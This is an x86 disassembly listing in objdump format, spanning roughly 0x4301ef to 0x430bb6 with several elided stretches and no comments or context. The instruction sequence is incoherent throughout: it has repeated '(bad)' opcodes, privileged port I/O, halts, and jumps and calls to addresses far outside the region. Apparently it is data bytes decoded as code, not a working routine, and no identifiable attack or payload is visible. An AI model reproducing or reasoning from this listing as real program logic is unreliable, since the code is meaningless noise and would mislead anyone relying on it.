  4301ef:	test   DWORD PTR gs:[esp+esi*2],0xee4c3d8
  4301f7:	in     eax,0x19
  4301f9:	mov    edi,0x6d7e5c30
  4301fe:	mov    dl,BYTE PTR [edx+0x16]
  430201:	mov    gs,ebx
  430203:	xchg   BYTE PTR [esi-0x5f26d5f9],dh
  430209:	clc    
  43020a:	test   al,0xe9
  43020c:	jl     0x4301d8
  43020e:	push   0x7e
  430210:	cmp    DWORD PTR ds:0xbcfb2f16,edx
  430216:	in     al,0x4
  430218:	jmp    0xf4166026
  43021d:	das    
  43021e:	out    0x16,eax
  430220:	xchg   dx,ax
  430222:	ins    BYTE PTR es:[edi],dx
  430223:	push   ebx
  430224:	pop    ecx
  430225:	inc    esp
  430226:	cmp    dh,BYTE PTR [ebx+0x5281085b]
  43022c:	dec    edi
  43022d:	aad    0x5b
  43022f:	enter  0xd54b,0x67
  430233:	dec    ecx
  430234:	push   ss
  430235:	or     ecx,ebp
  430237:	add    eax,esi
  430239:	inc    ebx
  43023a:	cld    
  43023b:	repz add al,0xc5
  43023e:	call   0x91fc36cb
  430243:	xor    BYTE PTR [ecx+0x35],0xfc
  430247:	push   ecx
  430248:	pmullw mm6,mm1
  43024b:	mul    DWORD PTR [edi+0x18]
  43024e:	test   eax,0x3
	...
  430267:	add    BYTE PTR [eax],al
  430269:	jnp    0x4302b8
  43026b:	je     0x4301f4
  43026d:	add    al,0x42
  43026f:	ficom  DWORD PTR [ecx+0x7d]
  430272:	sar    eax,1
  430274:	or     al,0xbc
  430276:	mov    eax,0x11617d35
  43027b:	outs   dx,BYTE PTR ds:[esi]
  43027c:	xlat   BYTE PTR ds:[ebx]
  43027d:	xrelease xchg DWORD PTR [edx+0x4b5352],esp
  430284:	jmp    0x4302b5
  430286:	daa    
  430287:	jecxz  0x430237
  430289:	and    eax,0xe625befc
  43028e:	ror    DWORD PTR [esi+0x36],cl
  430291:	outs   dx,BYTE PTR ds:[esi]
  430292:	sar    edx,cl
  430294:	sbb    al,0xa0
  430296:	ror    BYTE PTR [esi-0x72],cl
  430299:	stos   DWORD PTR es:[edi],eax
  43029a:	stos   DWORD PTR es:[edi],eax
  43029b:	adc    BYTE PTR [ecx],ch
  43029d:	lock sti 
  43029f:	mov    esi,0xf6fbf1ff
  4302a4:	div    ebp
  4302a6:	xchg   ecx,eax
  4302a7:	or     al,0xb9
  4302a9:	out    dx,eax
  4302aa:	(bad)  
  4302ac:	fucomp st(5)
  4302ae:	sti    
  4302af:	ret    0x61dc
  4302b2:	mov    ebx,DWORD PTR [ecx]
  4302b4:	ret    
  4302b5:	icebp  
  4302b6:	lods   al,BYTE PTR ds:[esi]
  4302b7:	dec    ebx
  4302b8:	bound  edi,QWORD PTR [eax]
  4302ba:	inc    ebx
  4302bb:	cli    
  4302bc:	mov    esp,0xad153e5f
  4302c1:	dec    ebp
  4302c2:	add    eax,DWORD PTR [eax]
  4302c4:	cli    
  4302c5:	mov    bh,0xc3
  4302c7:	ret    
  4302c8:	fnsave [edi]
  4302ca:	sub    bh,dh
  4302cc:	fld    DWORD PTR [eax]
	...
  4302e6:	mov    bh,0xdf
  4302e8:	pop    ecx
  4302e9:	ret    0x83ee
  4302ec:	das    
  4302ed:	sub    DWORD PTR [eax],esi
  4302ef:	sub    BYTE PTR [edi],0x29
  4302f2:	mov    ecx,0x711586d9
  4302f7:	xor    BYTE PTR [edi+edx*4],bh
  4302fa:	dec    esp
  4302fb:	mov    bh,BYTE PTR [ebp-0x2b]
  4302fe:	dec    esp
  4302ff:	ds jne 0x4302d3
  430302:	and    DWORD PTR [ebx+0x69],eax
  430305:	jmp    0xd14abcae
  43030a:	pop    es
  43030b:	aas    
  43030c:	sti    
  43030d:	(bad)  
  43030e:	push   0xeba57f35
  430313:	mov    edx,esi
  430315:	add    BYTE PTR [ecx],bl
  430317:	and    al,0x7a
  430319:	(bad)  
  43031a:	xchg   edx,eax
  43031b:	pop    edx
  43031c:	gs mov ebx,ebx
  43031f:	ret    
  430320:	dec    esp
  430321:	(bad)  
  430322:	(bad)  
  430324:	das    
  430325:	(bad)  
  430326:	mov    eax,0x9d400a1e
  43032b:	mov    eax,eax
  43032d:	jne    0x4302bf
  43032f:	rol    DWORD PTR [eax+ebx*1+0x75],0xf9
  430334:	cld    
  430335:	push   DWORD PTR [edx-0x77]
  430338:	enter  0x66ff,0x81
  43033c:	mov    WORD PTR [ebp+0x5],es
  43033f:	jbe    0x4302cd
  430341:	inc    ebp
  430342:	gs jbe 0x43033b
  430345:	adc    eax,0x3b36fd
	...
  430362:	add    al,bl
  430364:	lds    esi,FWORD PTR [ebx+0x10]
  430367:	ret    0xb5a
  43036a:	lea    ebx,[eax+0x6175f6ce]
  430370:	jbe    0x430368
  430372:	adc    eax,0x3b36d9
  430377:	(bad)  
  430378:	dec    edx
  430379:	mov    edi,0x7a3a608b
  43037e:	loopne 0x4303aa
  430380:	sub    al,0x88
  430382:	add    DWORD PTR [esi-0x77ff00ac],ebx
  430388:	or     eax,DWORD PTR [ebx-0x61eea81]
  43038e:	xor    dh,dl
  430390:	test   DWORD PTR [edi+0x14],esi
  430393:	sbb    al,0x5b
  430395:	add    ecx,DWORD PTR ds:0x59d
  43039b:	jnp    0x43035c
  43039d:	add    BYTE PTR [ebx-0x36a68db5],cl
  4303a3:	sahf   
  4303a4:	jnp    0x430328
  4303a6:	in     al,dx
  4303a7:	hlt    
  4303a8:	lods   al,BYTE PTR ds:[esi]
  4303a9:	pop    edi
  4303aa:	or     dh,dh
  4303ac:	sub    edi,edi
  4303ae:	dec    esi
  4303af:	inc    edx
  4303b0:	mov    bh,0x18
  4303b2:	enter  0xebe6,0x3
  4303b6:	xchg   DWORD PTR [ebx+eax*8+0x2c3486b3],ebp
  4303bd:	scas   al,BYTE PTR es:[edi]
  4303be:	cli    
  4303bf:	mov    ds:0xa7543b0,al
  4303c4:	mov    bh,0xc2
  4303c6:	pop    es
	...
  4303df:	add    cl,dh
  4303e1:	cmp    DWORD PTR [ecx],eax
  4303e3:	add    ah,dh
  4303e5:	sti    
  4303e6:	dec    edx
  4303e7:	jne    0x4303d5
  4303e9:	mov    bh,cl
  4303eb:	iret   
  4303ec:	out    0xeb,al
  4303ee:	add    esi,DWORD PTR [eax+0x67b086f5]
  4303f4:	sub    BYTE PTR [edi-0x54d9003d],ah
  4303fa:	xor    DWORD PTR [ebp-0x7908a7cc],eax
  430400:	mov    bl,0x23
  430402:	jle    0x4303c4
  430404:	or     al,bh
  430406:	sub    DWORD PTR [esi-0xa],esp
  430409:	push   ebx
  43040a:	mov    ebx,0xae2bb486
  43040f:	cli    
  430410:	loope  0x4303ed
  430412:	out    dx,al
  430413:	aas    
  430414:	hlt    
  430415:	test   al,0x43
  430417:	jne    0x430419
  430419:	xchg   esp,eax
  43041a:	add    eax,DWORD PTR [ecx]
  43041c:	hlt    
  43041d:	sub    edi,DWORD PTR [esi-0x41]
  430420:	idiv   BYTE PTR [esi-0x51]
  430423:	mov    WORD PTR [ecx+0x13],gs
  430426:	push   ecx
  430427:	sti    
  430428:	sbb    ebp,DWORD PTR [esi+0x6b1cfb3b]
  43042e:	add    eax,DWORD PTR [eax]
  430430:	hlt    
  430431:	mov    al,0x43
  430433:	jp     0x430411
  430435:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430436:	inc    ecx
  430437:	push   eax
  430438:	outs   dx,DWORD PTR ds:[esi]
  430439:	add    al,0x2a
  43043b:	cld    
  43043c:	clc    
  43043d:	out    0xe4,al
  43043f:	add    esi,esp
  430441:	aam    0xd1
  430443:	fadd   DWORD PTR [eax]
	...
  43045d:	sti    
  43045e:	sub    al,0xf7
  430460:	jecxz  0x430440
  430462:	inc    eax
  430463:	ins    BYTE PTR es:[edi],dx
  430464:	inc    ebx
  430465:	dec    ecx
  430466:	arpl   di,si
  430468:	inc    ebx
  430469:	fcomp  QWORD PTR cs:[edi+0x1604f841]
  430470:	adc    esp,DWORD PTR [ebx-0xf7bd02]
  430476:	mov    DWORD PTR [ebx+eax*1-0xc],eax
  43047a:	add    al,0x1
  43047c:	lods   al,BYTE PTR ds:[esi]
  43047d:	jp     0x430444
  43047f:	call   0xd7b405d2
  430484:	ret    
  430485:	xchg   ebx,eax
  430486:	(bad)  
  430487:	jecxz  0x430493
  430489:	dec    ebx
  43048a:	adc    BYTE PTR [ebp+0x73],ch
  43048d:	hlt    
  43048e:	add    al,0xe9
  430490:	(bad)  [ebx]
  430492:	push   cs
  430493:	jmp    0x5a4fde9b
  430498:	sbb    BYTE PTR [edi+edx*2-0x5a],cl
  43049c:	add    ebx,DWORD PTR [edi+0x1a]
  43049f:	add    eax,0x70051bf5
  4304a4:	(bad)  
  4304a7:	and    eax,0x5dd7dfd7
  4304ac:	adc    BYTE PTR [ebx+edx*1-0x4b33fc57],cl
  4304b3:	ins    DWORD PTR es:[edi],dx
  4304b4:	ret    
  4304b5:	xor    edi,DWORD PTR [edi]
  4304b7:	ror    DWORD PTR [esi+0x47],cl
  4304ba:	mov    WORD PTR [ebx+0x5dc09bfb],fs
  4304c0:	ret    
	...
  4304d9:	add    BYTE PTR [ebx],bl
  4304db:	lea    ebp,[eax-0x608f0f9]
  4304e1:	xor    eax,0xe0ffcf73
  4304e6:	pop    ds
  4304e7:	mov    BYTE PTR [edi+0x418df7a9],al
  4304ed:	icebp  
  4304ee:	inc    eax
  4304ef:	repz cli 
  4304f1:	mov    dh,0x6d
  4304f3:	retf   
  4304f4:	pop    es
  4304f5:	inc    ecx
  4304f6:	push   eax
  4304f7:	mov    BYTE PTR [eax-0x17],al
  4304fa:	pop    esi
  4304fb:	(bad)  
  4304fc:	or     eax,esi
  4304fe:	jmp    0x8907:0x8a72d33b
  430505:	sub    al,cl
  430507:	xchg   BYTE PTR [edx-0x1f],al
  43050a:	mov    ah,bh
  43050c:	push   edi
  43050d:	in     eax,dx
  43050e:	retf   
  43050f:	adc    bh,BYTE PTR [ecx]
  430511:	inc    ecx
  430512:	test   al,0xb3
  430514:	or     eax,0x740b4fd0
  430519:	fsub   st(6),st
  43051b:	fmul   QWORD PTR [edi]
  43051d:	std    
  43051e:	(bad)  
  43051f:	out    dx,al
  430520:	mov    edi,0x3c30f29
  430525:	adc    dh,BYTE PTR ds:0x8b4ee7d5
  43052b:	aas    
  43052c:	sti    
  43052d:	jo     0x4304d1
  43052f:	pop    es
  430530:	sti    
  430531:	pop    ss
  430532:	mov    ecx,0x37fbb819
  430537:	aas    
  430538:	mov    bh,ch
  43053a:	add    eax,0x2a5745
	...
  430557:	int    0xc2
  430559:	pop    es
  43055a:	xchg   esi,eax
  43055b:	repnz loop 0x430561
  43055e:	jmp    0xe5fdda5a
  430563:	test   BYTE PTR [eax+eax*1],0xbe
  430567:	rcr    BYTE PTR [ecx],0x24
  43056a:	cli    
  43056b:	aaa    
  43056c:	aas    
  43056d:	test   BYTE PTR [ecx],ch
  43056f:	dec    ebx
  430570:	add    ch,BYTE PTR [esi]
  430572:	sub    DWORD PTR [edi+0x1d00003c],edi
  430578:	add    eax,DWORD PTR [ebx+0x53bc054e]
  43057e:	and    al,0x15
  430580:	js     0x430502
  430582:	shr    DWORD PTR [ebx],0x5
  430585:	add    BYTE PTR [eax],al
  430587:	vpmulhuw xmm7,xmm6,xmm7
  43058b:	retf   0xc087
  43058e:	jne    0x43053f
  430590:	mov    ebp,0xd1850845
  430595:	idiv   bh
  430597:	cmp    bh,BYTE PTR [edx+0x2d33080]
  43059d:	add    BYTE PTR [ebx-0x7e77bee5],cl
  4305a3:	ror    DWORD PTR [eax],0x0
  4305a6:	add    BYTE PTR [esi],ah
  4305a8:	dec    eax
  4305a9:	add    edx,DWORD PTR [ebx-0x32]
  4305ac:	in     eax,dx
  4305ad:	mov    BYTE PTR [eax+0x8c5],bl
  4305b3:	push   ss
  4305b4:	dec    eax
  4305b5:	add    ecx,DWORD PTR [ecx-0x1f1eb]
	...
  4305d3:	add    BYTE PTR [ebp+0x14083dbd],bl
  4305d9:	stos   BYTE PTR es:[edi],al
  4305da:	aas    
  4305db:	push   es
  4305dc:	lea    eax,[edx]
  4305de:	add    DWORD PTR [esi+0x65],0xffffffc9
  4305e2:	jg     0x430628
  4305e4:	push   ebx
  4305e5:	add    al,BYTE PTR [eax]
  4305e7:	add    DWORD PTR [ebp+0x2],ecx
  4305ea:	add    BYTE PTR [ebx-0x6777c56d],cl
  4305f0:	test   DWORD PTR [eax],ecx
  4305f2:	add    BYTE PTR [eax],al
  4305f4:	mov    BYTE PTR [edi+0x3],0x33
  4305f8:	adc    al,0x28
  4305fa:	mov    BYTE PTR [eax+0x85d],cl
  430600:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430601:	inc    edi
  430602:	add    ecx,DWORD PTR [eax+0x17475]
  430608:	hlt    
  430609:	sub    edi,DWORD PTR [eax+0x42]
  43060c:	in     al,dx
  43060d:	xor    DWORD PTR [ecx+0x22bb486],0x4e
  430614:	repz sub edi,edi
  430617:	dec    edi
  430618:	add    esp,DWORD PTR [ecx-0x9]
  43061b:	adc    BYTE PTR [ebx+ebp*1-0x2e03bd88],dh
  430622:	add    ch,BYTE PTR [eax+0x44]
  430625:	mov    bl,0xc3
  430627:	(bad)  
  430628:	clc    
  430629:	stc    
  43062a:	sti    
  43062b:	(bad)  
  43062c:	(bad)  
  43062e:	inc    esi
  43062f:	adc    eax,0xffbf5978
  430634:	jle    0x43061b
  430636:	sti    
  430637:	push   ecx
	...
  430650:	add    BYTE PTR [ecx-0x5d],dh
  430653:	adc    eax,DWORD PTR [edx]
  430655:	hlt    
  430656:	sub    esi,DWORD PTR [edi+eiz*2-0x3df4a2]
  43065d:	adc    ebx,DWORD PTR [esp+eiz*8]
  430660:	cmp    eax,0x5fac03f4
  430665:	ss sub al,0xd7
  430668:	inc    edi
  430669:	adc    al,0xea
  43066b:	add    ebp,DWORD PTR [eax-0x3c]
  43066e:	or     eax,edx
  430670:	call   FWORD PTR [ebx]
  430672:	push   esp
  430673:	fistp  QWORD PTR ds:0x5b3503f4
  430679:	mov    dh,0x2b
  43067b:	xlat   BYTE PTR ds:[ebx]
  43067c:	xor    al,0xc9
  43067e:	imul   edi,edi,0xc5790f67
  430684:	jmp    FWORD PTR [eax-0x63]
  430687:	repz addr16 ja 0x4306d7
  43068b:	(bad)  
  43068e:	(bad)  
  43068f:	mov    bl,0x3
  430691:	outs   dx,DWORD PTR ds:[esi]
  430692:	test   DWORD PTR gs:[eax+0x7bda2f5],0x102d0477
  43069d:	fisttp DWORD PTR [ebx-0x20]
  4306a0:	jmp    0x43066c
  4306a2:	or     eax,0x42bf447c
  4306a7:	in     eax,0x3
  4306a9:	jnp    0x430671
  4306ab:	in     al,dx
  4306ac:	mov    ebx,0xd0b10187
  4306b1:	out    0x89,eax
  4306b3:	stos   DWORD PTR es:[edi],eax
  4306b4:	sti    
	...
  4306cd:	add    BYTE PTR [edx-0x4],bh
  4306d0:	call   0x197f06a4
  4306d5:	dec    ebx
  4306d6:	inc    esp
  4306d7:	adc    eax,0x87fbc16e
  4306dc:	or     DWORD PTR [edi*1-0x1f80cbb8],eax
  4306e3:	mov    ch,dl
  4306e5:	idiv   DWORD PTR [edx]
  4306e7:	aam    0xb9
  4306e9:	shr    bh,1
  4306eb:	cmp    ebx,esp
  4306ed:	arpl   dx,bp
  4306ef:	(bad)  
  4306f0:	call   0xbe3bb373
  4306f5:	js     0x43072e
  4306f7:	cmp    al,0x70
  4306f9:	test   al,0xa7
  4306fb:	mov    ?,WORD PTR [eax+ecx*2]
  4306fe:	fnstcw WORD PTR [edx]
  430700:	jmp    0x6a4efb08
  430705:	jbe    0x4306fb
  430707:	add    al,0xe9
  430709:	jle    0x430739
  43070b:	or     eax,0xacf3b05e
  430710:	in     al,0x4
  430712:	hlt    
  430713:	add    al,0x66
  430715:	inc    esp
  430716:	push   es
  430717:	sub    eax,0x3c5f5f65
  43071c:	ins    BYTE PTR es:[edi],dx
  43071d:	inc    ebx
  43071e:	loope  0x4306d8
  430720:	mov    cl,0x4a
  430722:	leave  
  430723:	or     BYTE PTR [eax+eax*8+0x47],dh
  430727:	aad    0x50
  430729:	mov    esi,0xe900049d
  43072e:	mov    ebx,0xc27444
	...
  43074b:	js     0x430707
  43074d:	sti    
  43074e:	jmp    0x9d430c43
  430753:	and    al,0xcb
  430755:	push   edx
  430756:	push   ss
  430757:	inc    esp
  430758:	adc    BYTE PTR [edi+0x1],cl
  43075b:	xor    DWORD PTR [ebp-0x5],eax
  43075e:	push   es
  43075f:	mov    bh,BYTE PTR [edi+eax*4]
  430762:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  430763:	inc    DWORD PTR [ebx+0x29add58]
  430769:	xchg   DWORD PTR [edi-0x22827d11],esp
  43076f:	lds    edx,FWORD PTR ss:[ebx]
  430772:	call   0x1b73b67
  430777:	pop    ecx
  430778:	mov    DWORD PTR [edi],0x81acf743
  43077e:	dec    eax
  43077f:	mov    dl,0x3b
  430781:	arpl   WORD PTR [edx-0x29],bp
  430784:	stc    
  430785:	inc    DWORD PTR [eax-0x53]
  430788:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430789:	cmp    eax,0x67d668e9
  43078e:	cmp    eax,0x9dffc529
  430793:	or     BYTE PTR [eax+0x50],al
  430796:	loope  0x430808
  430798:	inc    eax
  430799:	and    BYTE PTR [eax+edi*1+0x10],ah
  43079d:	xchg   ebp,eax
  43079e:	stos   BYTE PTR es:[edi],al
  43079f:	stc    
  4307a0:	mov    ecx,0xd7f5f5f3
  4307a5:	out    0x4a,eax
  4307a7:	mov    DWORD PTR [ebx],edi
  4307a9:	sti    
  4307aa:	outs   dx,BYTE PTR ds:[esi]
  4307ab:	inc    ebx
  4307ac:	aaa    
  4307ad:	call   0x430834
	...
  4307c6:	add    BYTE PTR [eax],al
  4307c8:	pop    ecx
  4307c9:	cmp    edi,ebx
  4307cb:	jae    0x430786
  4307cd:	and    eax,DWORD PTR [esi]
  4307cf:	push   esi
  4307d0:	sub    esi,DWORD PTR [edi]
  4307d2:	call   0xfb7e6935
  4307d7:	add    BYTE PTR [edi-0x39],cl
  4307da:	push   esi
  4307db:	pop    ebx
  4307dc:	add    al,0xc3
  4307de:	pop    es
  4307df:	add    BYTE PTR [eax-0x48],bl
  4307e2:	jmp    0x43076f
  4307e4:	pop    eax
  4307e5:	xor    eax,DWORD PTR [eax+0x125ec]
  4307eb:	add    BYTE PTR [edx-0x80],ch
  4307ee:	shr    BYTE PTR [ebx*2-0x4ff78b34],0xbb
  4307f6:	idiv   ebp
  4307f8:	repnz int 0x4f
  4307fb:	mov    esi,esp
  4307fd:	fsub   DWORD PTR [edi]
  4307ff:	pop    ebp
  430800:	add    cl,ah
  430802:	test   al,al
  430804:	imul   esp,ecx,0x74e14782
  43080a:	xor    BYTE PTR [edi-0x27],0xb3
  43080e:	add    DWORD PTR [ebp-0x3b],0xffffffc3
  430812:	idiv   bh
  430814:	or     eax,0xb0f884b2
  430819:	int    0xf6
  43081b:	push   eax
  43081c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43081d:	shl    ebp,1
  43081f:	inc    DWORD PTR [edx-0x163f8094]
  430825:	push   esi
  430827:	inc    edi
  430828:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  430829:	adc    eax,eax
  43082b:	pop    edi
	...
  430844:	add    BYTE PTR [eax+eax*8+0x7],ah
  430848:	add    BYTE PTR [esi-0x4e3dc03a],bh
  43084e:	push   es
  43084f:	push   ebp
  430850:	mov    esp,DWORD PTR [ecx-0x7f]
  430853:	in     al,dx
  430854:	xor    al,0xde
  430856:	jbe    0x430882
  430858:	fcomi  st,st(7)
  43085a:	cmp    al,0x8c
  43085c:	inc    ebp
  43085d:	xor    DWORD PTR [ecx+0x4b],0x88f63089
  430864:	pop    ebp
  430865:	sub    DWORD PTR [edi-0x2d0b27a4],edi
  43086b:	jmp    0xffaef2bf
  430870:	jle    0x4308a2
  430872:	xor    BYTE PTR [edx+0x75],dh
  430875:	and    al,0xb5
  430877:	mov    eax,ds:0x42ec4ce7
  43087c:	sti    
  43087d:	xor    esp,DWORD PTR [eax-0x368ff4c2]
  430883:	(bad)  
  430884:	push   esp
  430886:	sbb    cl,dl
  430888:	pop    es
  430889:	or     al,0x89
  43088b:	inc    edx
  43088c:	sti    
  43088d:	adc    esp,DWORD PTR [eax-0x268ff4c2]
  430893:	(bad)  
  430894:	push   esp
  430896:	mov    dh,0xcf
  430898:	add    ebp,DWORD PTR [ecx+0x69]
  43089b:	das    
  43089c:	push   edx
  43089d:	mov    ebx,0x7fa45360
  4308a2:	jmp    0x4308a7
  4308a4:	mov    DWORD PTR [ecx],edi
  4308a6:	pop    esp
  4308a7:	jge    0x430906
	...
  4308c1:	add    al,ah
  4308c3:	push   edx
  4308c4:	icebp  
  4308c5:	(bad)  
  4308c7:	jmp    0x4308cc
  4308c9:	mov    DWORD PTR [ecx],esi
  4308cb:	inc    esp
  4308cc:	pop    es
  4308cd:	mov    edi,0x7edd284a
  4308d2:	cmp    dl,ch
  4308d4:	inc    ecx
  4308d5:	pop    esp
  4308d6:	sub    BYTE PTR [eax],ah
  4308d8:	mov    edi,0x43643188
  4308dd:	jae    0x4308d7
  4308df:	test   al,0xc0
  4308e1:	jmp    0x430952
  4308e3:	bound  edi,QWORD PTR [ebp+0x3]
  4308e6:	pushf  
  4308e7:	jno    0x43094b
  4308e9:	sti    
  4308ea:	mov    eax,DWORD PTR [eax+ebp*4-0xd]
  4308ee:	or     bl,BYTE PTR [edx+0x76]
  4308f1:	inc    ebp
  4308f2:	pushf  
  4308f3:	add    edi,DWORD PTR [edi+0x61]
  4308f6:	mov    dh,0x2b
  4308f8:	xlat   BYTE PTR ds:[ebx]
  4308f9:	jp     0x4308d0
  4308fb:	add    al,0xa7
  4308fd:	add    esi,DWORD PTR [ebx-0x3bb8e6c7]
  430903:	or     BYTE PTR [esi+0x40],ah
  430906:	in     al,0x42
  430908:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430909:	cli    
  43090a:	hlt    
  43090b:	jg     0x430936
  43090d:	rol    DWORD PTR [edx-0x7f],1
  430910:	pushf  
  430911:	cli    
  430912:	push   0xb93f18af
  430917:	sub    cl,ch
  430919:	int3   
  43091a:	jmp    0x430920
  43091c:	adc    ebp,edi
  43091e:	sbb    eax,0xb17b1a39
  430923:	push   eax
  430924:	mov    eax,ds:0xcf
	...
  43093d:	add    BYTE PTR [eax],al
  43093f:	adc    al,cl
  430941:	xchg   ebx,eax
  430942:	sti    
  430943:	push   cs
  430944:	scas   eax,DWORD PTR es:[edi]
  430945:	and    BYTE PTR [ebp+ecx*4+0x1e],bl
  430949:	jmp    0x191ac651
  43094e:	sar    ah,1
  430950:	aaa    
  430951:	je     0x430986
  430953:	out    dx,eax
  430954:	adc    ah,BYTE PTR [ecx+0x6f0523f1]
  43095a:	shl    dl,0x2b
  43095d:	add    BYTE PTR [ecx+0x49],bh
  430960:	push   ebp
  430961:	shr    DWORD PTR [eax],0xc9
  430964:	cmp    dl,al
  430966:	jp     0x4309a1
  430968:	push   ecx
  430969:	xor    eax,edx
  43096b:	mov    edx,0xaefc3bc0
  430970:	mov    dl,0x90
  430972:	pop    ebx
  430973:	jmp    0xdd46f292
  430978:	fnstcw WORD PTR [eax+0x1c37eccf]
  43097e:	xor    al,0x8f
  430980:	adc    dl,BYTE PTR [ecx-0xf]
  430983:	retf   
  430984:	add    al,0xb7
  430986:	inc    ebx
  430987:	push   ds
  430988:	fsubr  QWORD PTR [edi+0x4f041]
  43098e:	sbb    al,0xef
  430990:	sub    BYTE PTR [edi+0x71],bh
  430993:	mov    dl,0xb1
  430995:	or     BYTE PTR [esi+0x44],ah
  430998:	or     al,0xfb
  43099a:	hlt    
  43099b:	sbb    eax,DWORD PTR [edi]
  43099d:	inc    eax
  43099e:	jmp    0xb752bb5d
	...
  4309bb:	add    BYTE PTR [edi+0x1df5753b],al
  4309c1:	cmp    dl,bh
  4309c3:	mov    ah,0x3f
  4309c5:	cmp    edx,DWORD PTR ds:0xfff8285d
  4309cb:	imul   edi,DWORD PTR [eax+ecx*1],0xef1ca700
  4309d2:	inc    esp
  4309d3:	stc    
  4309d4:	xor    edi,DWORD PTR [edx]
  4309d6:	cs sub esi,esp
  4309d9:	dec    ebp
  4309da:	bound  esp,QWORD PTR [eax+0x3]
  4309dd:	(bad)  
  4309de:	pop    esp
  4309df:	sub    ecx,DWORD PTR [ebx]
  4309e1:	cmp    BYTE PTR [edx+esi*2-0x5d],dl
  4309e5:	mov    DWORD PTR [esi+0x7ed2a111],0x6b231f2
  4309ef:	out    0xb3,al
  4309f1:	or     edi,ebx
  4309f3:	hlt    
  4309f4:	sbb    eax,DWORD PTR [edi]
  4309f6:	inc    eax
  4309f7:	jmp    0xe9a96748
  4309fc:	xor    BYTE PTR [edx+0x3c31fa0b],dh
  430a02:	jne    0x4309f5
  430a04:	cmp    al,0x78
  430a06:	call   0xfb7f4360
  430a0b:	bound  edi,QWORD PTR [eax]
  430a0d:	cmp    bl,0x27
  430a10:	add    eax,esp
  430a12:	mov    ebp,fs
  430a14:	lock add eax,0x7d1f9b1d
  430a1b:	lock test DWORD PTR [edi+eax*4],0x0
	...
  430a37:	add    BYTE PTR [eax],al
  430a39:	std    
  430a3a:	mov    bh,0xed
  430a3c:	je     0x4309dd
  430a3e:	push   0xbc5975f6
  430a43:	mov    edx,0xe33b60ff
  430a48:	jne    0x430a24
  430a4a:	shl    esi,0x8b
  430a4d:	adc    ebx,esi
  430a4f:	stc    
  430a50:	xor    bl,BYTE PTR ds:0x985b5962
  430a56:	lds    eax,FWORD PTR [edi]
  430a58:	add    BYTE PTR [eax-0x44],ah
  430a5b:	jmp    0x430aae
  430a5d:	pop    esi
  430a5e:	imul   ecx,DWORD PTR [esi-0x1],0xf8823b70
  430a65:	xchg   esi,eax
  430a66:	shl    esi,cl
  430a68:	adc    eax,0x3b32ed
  430a6d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  430a6e:	call   0xae690eff
  430a73:	inc    ebx
  430a74:	add    BYTE PTR [edi],bl
  430a76:	mov    edx,0x778cfc44
  430a7b:	test   DWORD PTR [eax],0x81000311
  430a81:	push   ds
  430a82:	add    edx,edi
  430a84:	(bad)  
  430a85:	fld    QWORD PTR [ebx+0x62cd00f3]
  430a8b:	add    BYTE PTR [edi+0x15],dh
  430a8e:	mov    esp,0xb2b5fc4c
  430a93:	pop    ss
  430a94:	add    ch,bl
  430a96:	mov    dh,0xbf
  430a98:	je     0x430a83
  430a9a:	mov    edi,0xc74
	...
  430ab3:	add    BYTE PTR [eax],al
  430ab5:	add    BYTE PTR [esi+0x38],al
  430ab8:	div    BYTE PTR [ebp-0x6b]
  430abb:	scas   eax,DWORD PTR es:[edi]
  430abc:	add    edi,DWORD PTR [eax+0xe]
  430abf:	jno    0x430ab7
  430ac1:	adc    eax,0x3b3529
  430ac6:	adc    dl,al
  430ac8:	ja     0x430a92
  430aca:	hlt    
  430acb:	mov    al,ds:0x6ccffab7
  430ad0:	ret    0xf7c0
  430ad3:	cmp    DWORD PTR [eax+0x2],0xffffffc7
  430ad7:	je     0x430ab6
  430ad9:	mov    BYTE PTR [eax],al
  430adb:	xor    al,0x78
  430add:	ret    
  430ade:	pop    edi
  430adf:	sub    eax,DWORD PTR [eax-0x5ac09c38]
  430ae5:	push   esi
  430ae6:	sub    eax,0xa9fff6ea
  430aeb:	jbe    0x430b31
  430aed:	je     0x430aff
  430aef:	pop    eax
  430af0:	js     0x430ae2
  430af2:	inc    ebx
  430af3:	pop    ecx
  430af4:	cmp    ecx,DWORD PTR [esi]
  430af6:	mov    ah,0x2b
  430af8:	js     0x430af2
  430afa:	jne    0x430ae3
  430afc:	(bad)  
  430afd:	std    
  430afe:	sub    ebp,DWORD PTR [esi+edi*2]
  430b01:	sti    
  430b02:	hlt    
  430b03:	sub    ebx,DWORD PTR [edi+0x725ba300]
  430b09:	dec    ebx
  430b0a:	cmc    
  430b0b:	add    ecx,DWORD PTR [edi]
  430b0d:	sbb    ah,dh
  430b0f:	sub    edi,DWORD PTR [ebx-0x40]
  430b12:	mov    BYTE PTR [edi+0x44],al
  430b15:	je     0x430ae7
  430b17:	pop    ebx
  430b18:	inc    esp
  430b19:	je     0x430b1b
	...
  430b33:	sbb    BYTE PTR [esp+ebp*4-0x6],bl
  430b37:	and    ah,BYTE PTR [edi]
  430b39:	in     eax,dx
  430b3a:	xchg   DWORD PTR [edi],eax
  430b3c:	in     al,dx
  430b3d:	add    eax,DWORD PTR [ebp-0x72ab5c4c]
  430b43:	inc    ebx
  430b44:	dec    edi
  430b45:	sti    
  430b46:	ror    BYTE PTR [ecx+0x62],0x8b
  430b4a:	or     bh,BYTE PTR [edx-0x30fff8d9]
  430b50:	sub    al,BYTE PTR [edx-0x21f14c38]
  430b56:	mov    ebp,0x85d92bfc
  430b5b:	les    eax,FWORD PTR [ecx+ebp*4]
  430b5e:	cs lock add eax,0xc1a5653
  430b65:	xor    ebp,eax
  430b67:	(bad)  
  430b68:	sahf   
  430b69:	int    0x35
  430b6b:	jmp    0x430b9b
  430b6d:	data16 sub dh,bh
  430b70:	and    DWORD PTR [ebx+0x7701d5f4],0xff44a613
  430b7a:	or     al,0xca
  430b7c:	sahf   
  430b7d:	sbb    eax,0x66530354
  430b82:	test   DWORD PTR es:[ecx+0x1d5f427],0xf36caa39
  430b8d:	retf   0xa58c
  430b90:	add    bl,BYTE PTR [ebx+0x323cb346]
  430b96:	mov    ecx,0x0
	...
  430baf:	add    cl,dh
  430bb1:	xor    eax,0x35f7e7b5
  430bb6:	cld    
